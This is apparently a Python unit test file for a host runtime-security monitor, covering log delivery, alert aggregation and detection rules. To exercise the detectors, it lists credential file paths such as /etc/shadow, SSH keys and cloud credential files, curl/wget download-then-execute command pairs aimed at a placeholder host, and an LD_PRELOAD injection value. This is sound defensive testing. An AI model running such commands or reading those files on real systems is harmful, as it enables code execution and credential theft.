"""Grok review regressions: delivery, normalization, aggregation and public boundary."""
import tempfile,json,time,unittest,os,threading,urllib.request,urllib.error
from pathlib import Path
from runtime.engine import Store,SENSITIVE_PATHS
from runtime.command_parse import parse
from runtime.sensor import LogPump
class Adapter:
 def __init__(self):
  import collections
  self.stats=collections.Counter()
 def normalize(self,item):self.stats['normalized']+=1;return item
class DeliveryTests(unittest.TestCase):
 def test_burst_3000_and_failure_restart(self):
  with tempfile.TemporaryDirectory() as t:
   log=Path(t)/'host.jsonl';log.write_text('');cfg={'log':str(log),'cursor':str(Path(t)/'cursor.json')};sent=set()
   class Client:
    fail=True
    def call(self,path,body):
     if self.fail:raise OSError('offline')
     sent.update(x['id'] for x in body['events']);return {'acknowledged':len(body['events'])}
   client=Client();adapter=Adapter();pump=LogPump(client,adapter,cfg);pump.step();before=json.loads(Path(cfg['cursor']).read_text())
   with log.open('a') as f:
    for i in range(3000):f.write(json.dumps({'id':str(i)})+'\n')
   pump.step();self.assertEqual(json.loads(Path(cfg['cursor']).read_text())['offset'],before['offset']);self.assertEqual(len(pump.pending),100);pump.close()
   client.fail=False;pump=LogPump(client,adapter,cfg)
   for _ in range(40):pump.step()
   self.assertEqual(len(sent),3000);self.assertEqual(adapter.stats['spoolDropped'],0);self.assertEqual(json.loads(Path(cfg['cursor']).read_text())['offset'],log.stat().st_size);pump.close()
 def test_lost_ack_is_deduplicable(self):
  with tempfile.TemporaryDirectory() as t:
   log=Path(t)/'log';log.write_text('{"id":"a"}\n');sent=[]
   class Client:
    def call(self,p,b):sent.extend(b['events'])
   cfg={'log':str(log),'cursor':str(Path(t)/'cursor')};p=LogPump(Client(),Adapter(),cfg);p.step();p.close();p=LogPump(Client(),Adapter(),cfg);p.step();p.close();self.assertEqual(len(sent),1)
class DetectionTests(unittest.TestCase):
 def setUp(self):
  self.t=tempfile.TemporaryDirectory();self.now=time.time();self.s=Store(Path(self.t.name)/'db');self.s.heartbeat('host',{'drop':0,'counters':{}})
 def tearDown(self):self.t.cleanup()
 def e(self,i,**kw):return {'id':str(i),'time':self.now,'kind':'process','workload':'w','pid':1,'identity':{'basis':'registered'},'result':'success',**kw}
 def test_aggregate20(self):
  self.s.ingest('host',[self.e(i,kind='network',destination='8.8.8.8',port=443,policy={'allowedNetworks':['127.0.0.0/8']}) for i in range(20)]);p=self.s.listing({});self.assertEqual(p['total'],1);self.assertEqual(p['items'][0]['count'],20);self.assertLessEqual(len(self.s.detail(p['items'][0]['id'])['evidence']),6)
 def test_10credential_paths(self):
  paths=['/etc/shadow','/root/.kube/config','/home/u/.git-credentials','/home/u/.netrc','/home/u/.docker/config.json','/home/u/id_rsa','/home/u/.config/gcloud/application_default_credentials.json','/home/u/.aws/credentials','/app/.env.production','/app/secrets.yaml']
  self.s.ingest('host',[self.e(i,kind='file',path=x,access='read_open') for i,x in enumerate(paths)]);self.assertEqual(self.s.listing({})['total'],10);self.assertGreaterEqual(len(SENSITIVE_PATHS),8)
 def test_configured_paths(self):
  s=Store(Path(self.t.name)/'custom',config={'sensitivePaths':{'custom':['/private/keys/*']}});s.ingest('host',[self.e('c',kind='file',path='/private/keys/a',access='read_open')]);self.assertEqual(s.listing({})['total'],1)
 def test_download_variants(self):
  pairs=[('curl -o/tmp/a https://e.x/a','sh /tmp/a'),('curl -O https://e.x/a.sh','./a.sh'),('wget https://e.x/a.sh','sh a.sh'),('sh -c "curl https://e.x/a > /tmp/a"','sh /tmp/a'),('curl --output=a https://e.x/a','./a')]
  for i,(download,execute) in enumerate(pairs):
   a=self.e(str(i)+'d',workload='w'+str(i),**parse(download,'/tmp'));b=self.e(str(i)+'x',time=self.now+1,workload='w'+str(i),**parse(execute,'/tmp'));self.s.ingest('host',[a,b])
  self.assertEqual(self.s.listing({'rule':['S04']})['total'],5)
 def test_bad_event_partial_ack(self):
  count=self.s.ingest('host',[self.e('ok',kind='file',path='/a/.env',access='read_open'),{'id':'bad'}]);self.assertEqual(count,1);self.assertEqual(len(self.s.last_ingest['host']['rejected']),1)
 def test_coverage_degraded(self):
  self.s.heartbeat('host',{'auditLost':0,'counters':{'spoolDropped':12}})
  with self.s.db(write=False) as c:p=self.s.coverage(c,'host')
  self.assertEqual(p['state'],'degraded');self.assertEqual(p['drop'],12)
 def test_queue_sources_and_hidden(self):
  self.s.heartbeat('other',{})
  for i in range(30):self.s.gate_create('host',{'requestKey':str(i),'tool':'runtime_lab_command','arguments':{},'runId':'r','workload':'w'})
  self.s.gate_create('other',{'requestKey':'x','tool':'runtime_lab_command','arguments':{'env':{'LD_PRELOAD':'/tmp/check.so'}},'runId':'r','workload':'w'})
  with self.assertRaises(ValueError):self.s.gate_create('other',{'requestKey':'secret','tool':'runtime_lab_command','arguments':{'token':'actual secret'},'runId':'r','workload':'w'})
 def test_migration_keeps_original_ids(self):
  from runtime.migrate_review import migrate
  for i in range(3):
   e=self.e('legacy'+str(i),kind='network',destination='8.8.8.8',port=443,policy={'allowedNetworks':['127.0.0.0/8']});e['source']='host'
   with self.s.db() as c:
    import runtime.engine as engine
    key='legacy-'+str(i);a={'id':key,'source':'host','workload':'w','createdAt':self.now,'rule':'S05','severity':'high','status':'open','revision':1,'evidence':[e]}
    c.execute('INSERT INTO alerts VALUES(?,?,?,?,?,?,?)',(key,self.now,'S05','high','open',key,engine.compact(a)))
  self.assertEqual(migrate(self.s),2);self.assertEqual(self.s.listing({})['total'],1)
  with self.s.db(write=False) as c:self.assertEqual(c.execute('SELECT count(*) FROM alerts').fetchone()[0],3)
 def test_listing_is_read_only(self):
  import sqlite3
  with self.s.db(write=False) as c:
   with self.assertRaises(sqlite3.OperationalError):c.execute('INSERT INTO meta VALUES(?,?)',('x','y'))
  self.s.listing({})
if __name__=='__main__':unittest.main()
